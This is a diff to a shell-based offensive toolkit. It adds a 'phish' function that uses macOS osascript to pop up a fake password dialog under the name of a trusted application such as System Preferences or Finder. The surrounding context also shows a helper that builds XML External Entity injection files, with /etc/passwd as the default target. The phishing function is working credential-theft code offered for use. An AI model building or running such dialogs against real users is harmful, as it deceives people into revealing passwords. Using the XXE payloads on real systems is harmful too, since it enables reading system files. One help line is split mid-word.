@@ -979,7 +979,8 @@ xxe(){
         ${underline}USAGE:${reset}       
             xxe [-h] [PAYLOAD]
         ${underline}OPTIONAL POSITIONAL ARGUMENTS:${reset} 
-            [PAYLOAD]  Payload to execute inside the entity (default: file:///etc/passwd)
+            [PAYLOAD]  Payload to exe
+	    cute inside the entity (default: file:///etc/passwd)
         ${underline}DESCRIPTION:${reset} 
             Generate a XML External Entity Injection file"
     else
@@ -1000,6 +1001,51 @@ EOL
         print_good "Generated ${bold}file.xml${reset} with ${bold}${payload}${reset} payload"
     fi 
 }
+
+phish() {
+	title=""
+	dialogue=""
+	application=""
+
+	if [[ "$@" =~ .*-h.* ]]; then
+		echo "
+        	${underline}USAGE:${reset}       
+            	phish [-h] -t [TITLE] -d [DIALOGUE] -a [APPLICATION]
+        	${underline}DESCRIPTION:${reset}
+		Makes a window pop up with a custom phishing dialog and title us		ing OSAscript (OSX only). Note: certain apps will prompt the use		r to 'allow terminal to control <insert application you're phish		ing with>.' This is primarily more important apps such as System		 Preferences, Finder, etc. "
+		return 0
+	elif [ $# != 6 ]; then
+		print_error "Invalid number of arguments. See 'phish -h' for help"
+		return 1
+	fi
+
+	while [ $# != 0 ]
+	do
+		case $1 in
+			-t)
+				title=$2
+				shift 2
+				;;
+			-d)
+				dialogue=$2
+				shift 2
+				;;
+			-a)
+				application=$2
+				shift 2
+				;;
+			*)
+				print_error "Invalid option '$1'"
+				return 1
+		esac
+	done
+print_info "Waiting for user input..."
+bash <<ENDSTRING
+osascript -e 'tell app "$application" to activate' -e 'tell app "$application" to activate' -e 'tell app "$application" to display dialog "$dialogue" & return & return  default answer "" with icon 1 with hidden answer with title "$title"'
+ENDSTRING
+
+}
+
 
 ###Commands that require root
 portblock(){
